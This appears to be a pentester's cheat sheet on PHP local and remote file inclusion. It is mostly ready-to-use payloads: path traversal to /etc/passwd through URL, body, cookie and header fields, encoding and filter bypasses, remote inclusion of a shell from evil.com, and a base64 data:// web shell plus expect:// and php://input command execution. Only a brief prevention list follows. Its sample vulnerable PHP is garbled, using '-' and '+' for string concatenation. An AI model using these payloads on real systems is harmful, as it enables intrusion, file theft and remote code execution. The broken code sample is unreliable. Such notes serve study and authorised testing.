---
tags:
  - file-inclusion
  - LFI
  - RFI
  - Web
ref: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md
---
---
## 1. Basics
- Vulnerable when dynamically included files based on user input or other variables
- Most commonly affects **PHP applications**
- Can lead to sensitive file disclosure, source code disclosure, or RCE
- Example: profile pictures on user accounts
#### LFI (Local File Inclusion)
- Includes files already on the target system
- Common targets: `/etc/passwd`, config files
- File is processed by PHP, not just read
#### RFI (Remote File Inclusion)
- Includes files hosted remotely
- Requires:
```ini
allow_url_include = On
```
- Disabled by default since PHP 5+
### Proof of Concept
**Vulnerable code and PoC**
```php
include($_GET['page']);

if (isset($_GET['lang'])) {
	$lang = validateInput($_GET['lang']);
	$path= "languages/" - $lang = ".php";
	include("languages"+$path);
}

# LFI
http://example.com/index.php?page=../../../etc/passwd
# RFI
http://example.com/index.php?page=http://evil.com/shell.txt
```
### Basic PoC
```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

page=index.html

# change page to 
page=../../../../etc/passwd
```
---
## Detailed Process
### Identify Injection Point
```text
http://example.com/index.php?page=index
```
Look for: `page=`, `file=`, `include=`, `template=`
**Can also be in other fields than in URL with HTTP GET**
```
# POST parameter
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

page=../../../../etc/passwd

# JSON body
POST /api/load HTTP/1.1
Content-Type: application/json

{"page":"../../../../etc/passwd"}

# Cookie
GET /index.php HTTP/1.1
Cookie: lang=../../../../etc/passwd

# User-Agent header
GET /index.php HTTP/1.1
User-Agent: ../../../../etc/passwd

# Referer header
GET /index.php HTTP/1.1
Referer: ../../../../etc/passwd

# X-Forwarded-For header
GET /index.php HTTP/1.1
X-Forwarded-For: ../../../../etc/passwd

# Session-based / second-order (value set earlier)
GET /set.php?theme=../../../../etc/passwd HTTP/1.1
# later
GET /index.php HTTP/1.1
Cookie: PHPSESSID=abc123
```
### Basic LFI / RFI
```text
# LFI
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=/etc/passwd

# RFI
http://example.com/index.php?page=http://evil.com/shell.txt
```
## Optional Step: Automated
- Burp intruder
- Kadimus
- ffuf
- SecLists-2024.4/Fuzzing/LFI
### Step 3: Null Byte Injection (PHP < 5.3.4)
- To terminate forced extensions like `.php`
- Only legacy PHP vulnerable
```text
http://example.com/index.php?page=../../../etc/passwd%00
```
**Backend**
```
# without
include($_GET['page']);
`../../../etc/passwd.php`

# with %00
../../../etc/passwd%00
../../../etc/passwd%00.php
`../../../etc/passwd`
```
### Step 4: Double Encoding
-  Bypass checks for `../`, `payloads` or etc.
```text
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
```
### Step 5: UTF-8 Encoding
- Use when bad unicode handling in filesystem or framework
```text
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```
### Step 6: Path Truncation
- Backend truncates path after validation (validates first then truncates into the first characters)
```text
http://example.com/index.php?page=../../../etc/passwd...........[REPEAT]
```
### Step 7: Filter Bypasses (Recursive lookups)
- Evade regex based checks (blacklist for example)
```text
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////etc/passwd

http://example.com/index.php?page=hthttpstps://website.etc.
```
- Can encode these payloads as well using above methods
---
## 3. Wrappers
- Wrap different data sources into a uniform interface
- Alternative protocols PHP understands
- Manually inject them
- Replace the file path after confirming LFI
Pattern:
```text
?page=FILE
?page=WRAPPER://FILE
```
- Wrappers are added by you
- Replace the file path
- Used after LFI confirmation
```text
LFI → Source Disclosure → Wrapper Abuse → RCE
```
#### Common Wrappers & When to Use Them
**php://filter – Source Code Disclosure**
- Read PHP source instead of execution (maybe see credentials in the PHP):
```text
?page=php://filter/convert.base64-encode/resource=index.php

# decode (base64)
base64 -d
```
**data:// – Inline RCE**
Use for quick payload execution:
```text
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```
**expect:// – Command Execution**
```text
?page=expect://id
```
**php://input – POST-based Payloads**
```bash
curl -X POST --data "<?php system('id'); ?>" "http://example.com/index.php?page=php://input%00"
```
**zip:// – File Upload to RCE**
```text
?page=zip://shell.jpg%23payload.php
```
**phar:// – Deserialization / RCE**
```text
?page=phar:///var/www/html/archive.phar/test.txt
```
---
## 4. Windows SMB RFI Bypass
- host smb share
```text
?page=\\10.0.0.1\share\shell.php
```
---
## Automated Tool
### Kadimus
```
./kadimus -u "http://example.com/index.php?page=FUZZ" -S
```
**Burp wordlists**
- path traversal also in burp intruder
```
SecLists-2024.4/Fuzzing/LFI

LFI-etc-files-of-all-linux-packages.txt
LFI-gracefulsecurity-linux.txt
LFI-gracefulsecurity-windows.txt
LFI-Jhaddix.txt
LFI-LFISuite-pathtotest-huge.txt
LFI-LFISuite-pathtotest.txt
LFI-linux-and-windows_by-1N3@CrowdShield.txt
LFI-Windows-adeadfed.txt
OMI-Agent-Linux.txt
```
---
## Prevention
- Avoid passing user input into paths and filenames
- Validate input with allow list (only allowed certain chars)
- Use a pre-defined base path
- Properly configured permissions and access controls
